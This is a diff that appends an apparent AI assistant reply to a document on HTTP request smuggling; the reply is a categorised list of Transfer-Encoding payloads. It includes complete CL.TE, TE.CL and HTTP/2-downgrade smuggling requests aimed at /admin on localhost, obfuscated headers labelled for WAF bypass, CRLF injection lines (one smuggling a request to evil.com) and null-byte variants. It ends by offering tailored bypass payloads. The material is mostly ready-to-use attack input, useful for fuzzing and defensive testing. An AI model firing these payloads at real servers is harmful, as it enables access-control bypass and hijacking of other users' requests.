@@ -525,3 +525,322 @@ def scan_http_smuggling(base_request):
 - BlackHat 2021: HTTP/2 Request Smuggling
 
 These techniques represent advanced, often undocumented vectors for HTTP request smuggling. Always ensure you have proper authorization before testing, as these can cause service disruption if not handled carefully.
+
+I understand now — you're asking for **payloads** (test cases, attack vectors, or fuzzing inputs) related to the `Transfer-Encoding` header. This is commonly used in **security testing**, **HTTP smuggling**, **request smuggling**, and **fuzzing** scenarios.
+
+Here's a comprehensive list of `Transfer-Encoding` payloads:
+
+---
+
+## 1. Basic Encoding Variations
+
+### Standard valid
+```
+Transfer-Encoding: chunked
+Transfer-Encoding: gzip
+Transfer-Encoding: deflate
+Transfer-Encoding: compress
+Transfer-Encoding: gzip, chunked
+Transfer-Encoding: deflate, chunked
+Transfer-Encoding: gzip, deflate, chunked
+```
+
+### Case variations
+```
+transfer-encoding: chunked
+TRANSFER-ENCODING: chunked
+TrAnSfEr-EnCoDiNg: chunked
+```
+
+### Whitespace variations
+```
+Transfer-Encoding: chunked
+Transfer-Encoding:  chunked
+Transfer-Encoding: chunked  
+Transfer-Encoding:    chunked
+Transfer-Encoding: chunked\t
+Transfer-Encoding:\tchunked
+Transfer-Encoding: chunked\r\n
+```
+
+---
+
+## 2. Chunked Encoding Payloads (for HTTP Smuggling)
+
+### Standard chunked format
+```
+POST / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+5
+hello
+0
+
+```
+
+### CL.TE (Content-Length + Transfer-Encoding) smuggling
+```
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+```
+
+### TE.CL smuggling
+```
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+12
+GET /admin HTTP/1.1
+Host: localhost
+0
+
+```
+
+### Obfuscated Transfer-Encoding header
+```
+Transfer-Encoding: xchunked
+Transfer-Encoding: chunkedx
+Transfer-Encoding: chunked, chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: chunked; charset=utf-8
+Transfer-Encoding: chunked; boundary=something
+Transfer-Encoding: chunked, x-gzip
+Transfer-Encoding: CHUNKED
+Transfer-Encoding: chunkEd
+```
+
+---
+
+## 3. Malformed / Fuzzing Payloads
+
+### Invalid encoding names
+```
+Transfer-Encoding: chunked2
+Transfer-Encoding: chunk
+Transfer-Encoding: chunked, invalid
+Transfer-Encoding: foobar
+Transfer-Encoding: null
+Transfer-Encoding: 123
+Transfer-Encoding: chunked;foo=bar
+Transfer-Encoding: chunked,,gzip
+Transfer-Encoding: chunked, ,gzip
+Transfer-Encoding: ,chunked
+Transfer-Encoding: chunked, 
+Transfer-Encoding: (chunked)
+Transfer-Encoding: "chunked"
+Transfer-Encoding: 'chunked'
+```
+
+### Multiple headers (duplicate)
+```
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+```
+```
+Transfer-Encoding: gzip
+Transfer-Encoding: chunked
+```
+
+### Combined with Content-Length variations
+```
+Content-Length: 0
+Transfer-Encoding: chunked
+```
+```
+Content-Length: 100
+Transfer-Encoding: chunked
+```
+```
+Content-Length: 
+Transfer-Encoding: chunked
+```
+```
+Content-Length: -1
+Transfer-Encoding: chunked
+```
+
+---
+
+## 4. Chunk Extension Payloads
+
+### Chunk extensions (RFC 7230)
+```
+Transfer-Encoding: chunked
+
+5;foo=bar
+hello
+0;trailer=value
+
+```
+```
+5;foo="bar"
+hello
+0;done=true
+
+```
+```
+5;ignore
+hello
+0
+
+```
+
+### Chunk size variations
+```
+POST / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+0
+GET /admin HTTP/1.1
+Host: localhost
+0
+
+```
+(Zero-length chunk mid-stream)
+
+```
+ffffffffffffffff
+...
+```
+(Extremely large chunk size)
+
+```
+-1
+...
+```
+(Negative chunk size)
+
+```
+0x5
+...
+```
+(Hex with prefix)
+
+```
+5
+...
+```
+(Valid)
+
+```
+05
+...
+```
+(Leading zero)
+
+```
+5 
+...
+```
+(Space after size)
+
+---
+
+## 5. Header Injection / CRLF Payloads
+
+```
+Transfer-Encoding: chunked\r\nX-Injected: true
+```
+```
+Transfer-Encoding: chunked\r\n\r\nGET /evil HTTP/1.1\r\nHost: evil.com
+```
+```
+Transfer-Encoding: chunked\nX-Evil: true
+```
+
+---
+
+## 6. TE Header (Client Request) Payloads
+
+The client `TE` header negotiates accepted transfer encodings:
+
+```
+TE: chunked
+TE: gzip
+TE: deflate
+TE: chunked, gzip, deflate
+TE: trailers
+TE: chunked;q=0.8, gzip;q=0.5
+TE: 
+TE: *
+TE: chunked, identity
+TE: compress
+```
+
+---
+
+## 7. Combined Attack Vectors
+
+### HTTP/2 to HTTP/1 smuggling
+```
+:method: POST
+:path: /
+:scheme: https
+transfer-encoding: chunked
+content-length: 100
+
+0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n
+```
+
+### Chunked + Connection header
+```
+Transfer-Encoding: chunked
+Connection: keep-alive, Transfer-Encoding
+```
+
+### Chunked with trailer headers
+```
+Transfer-Encoding: chunked
+
+5
+hello
+0
+X-Malicious: true
+
+```
+
+---
+
+## 8. Null Byte / Unicode Payloads
+
+```
+Transfer-Encoding: chunked%00
+Transfer-Encoding: chunked\x00
+Transfer-Encoding: chunked%0d%0a
+Transfer-Encoding: chunked﻿
+Transfer-Encoding: chunked⁠
+```
+
+---
+
+## Summary Table by Category
+
+| Category | Purpose |
+|----------|---------|
+| Valid encodings | Baseline functionality |
+| Case/whitespace | Bypass weak filters |
+| CL/TE smuggling | Request smuggling attacks |
+| TE/CL smuggling | Request smuggling attacks |
+| Obfuscated names | WAF/filter bypass |
+| Chunk extensions | Chunk parsing edge cases |
+| Chunk size fuzzing | Integer overflow/parsing bugs |
+| Duplicate headers | Header normalization bypass |
+| CRLF injection | Header injection attacks |
+| TE negotiation | Client-side fuzzing |
+| Null/Unicode | Parser differential attacks |
+
+---
+
+If you're looking for specific **automated tools** to generate these (like `httpx`, `ffuf`, ` smuggler.py`, or Burp Intruder payloads), or want **targeted payloads** for a specific scenario (WAF bypass, HTTP smuggling, fuzzing), let me know and I'll tailor them.
